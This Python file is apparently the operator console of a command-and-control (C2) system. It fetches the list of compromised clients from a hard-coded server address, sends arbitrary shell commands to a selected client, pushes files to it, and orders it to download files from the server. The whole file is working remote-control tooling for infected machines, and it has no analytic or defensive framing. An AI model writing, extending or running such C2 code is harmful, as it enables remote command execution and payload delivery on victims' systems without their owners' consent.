# c2_control_panel.py
import requests, os

SERVER_URL = "http://100.64.4.148:5000"
current_client = None

def fetch_clients():
    try:
        response = requests.get(f"{SERVER_URL}/clients")
        if response.status_code == 200:
            return response.json().get('clients', [])
        else:
            print(f"Error fetching clients: {response.status_code}")
            return []
    except Exception as e:
        print(f"Error fetching clients: {e}")
        return []

def list_clients(client_list):
    print("\nAvailable clients:")
    for i, client in enumerate(client_list):
        print(f"{i + 1}. {client}")
    print()

def switch_client(client_list):
    global current_client
    list_clients(client_list)

    try:
        choice = int(input("Enter the client number to switch to: "))
        if 1 <= choice <= len(client_list):
            current_client = client_list[choice - 1]
            print(f"Switched to client {current_client}")
        else:
            print("Invalid choice. Please try again.")
    except ValueError:
        print("Invalid input. Please enter a number.")

def set_command(client_id, command):
    try:
        response = requests.post(f"{SERVER_URL}/set_command/{client_id}", json={'command': command})
        if response.status_code == 200:
            print(f"Command '{command}' sent to client {client_id}")
        else:
            print(f"Failed to send command. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending command: {e}")

def download_file_to_client(file_name):
    """
    Sends a download command to the client so it can download the file from the server.
    """
    try:
        # Send a download command to the client to download the file from the server
        command = f"download {file_name}"
        set_command(current_client, command)
        print(f"Download command for '{file_name}' sent to client {current_client}.")
    except Exception as e:
        print(f"Error sending download command: {e}")

def upload_file(client_id, file_path):
    file_name = os.path.basename(file_path)
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(f"{SERVER_URL}/upload/{client_id}", files=files)
            if response.status_code == 200:
                print(f"File '{file_name}' uploaded successfully.")
            else:
                print(f"Failed to upload file. Status Code: {response.status_code}")
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e:
        print(f"Error uploading file: {e}")

def show_menu():
    print("\nAvailable commands:")
    print("1. Send shell command")
    print("2. Switch to another client")
    print("3. Upload a file to the current client")
    print("4. Command the client to download a file from the server")
    print("5. Exit")
    print()

def main():
    global current_client

    client_list = fetch_clients()  # Fetch client UUIDs dynamically

    if not client_list:
        print("No clients available. Exiting...")
        return

    switch_client(client_list)

    while True:
        if current_client is None:
            print("No client selected. Use option 2 to switch to a client.")
        else:
            print(f"Current client: {current_client}")

        show_menu()
        choice = input("Select an option: ").strip()

        if choice == '1':
            command = input("Enter the command to send: ").strip()
            set_command(current_client, command)

        elif choice == '2':
            client_list = fetch_clients()  # Refresh client list
            switch_client(client_list)

        elif choice == '3':  # Upload file
            file_path = input("Enter the path to the file to upload: ").strip()
            upload_file(current_client, file_path)

        elif choice == '4':  # Command client to download file from server
            file_name = input("Enter the name of the file to download from the server: ").strip()
            download_file_to_client(file_name)

        elif choice == '5':
            print("Exiting...")
            break

        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
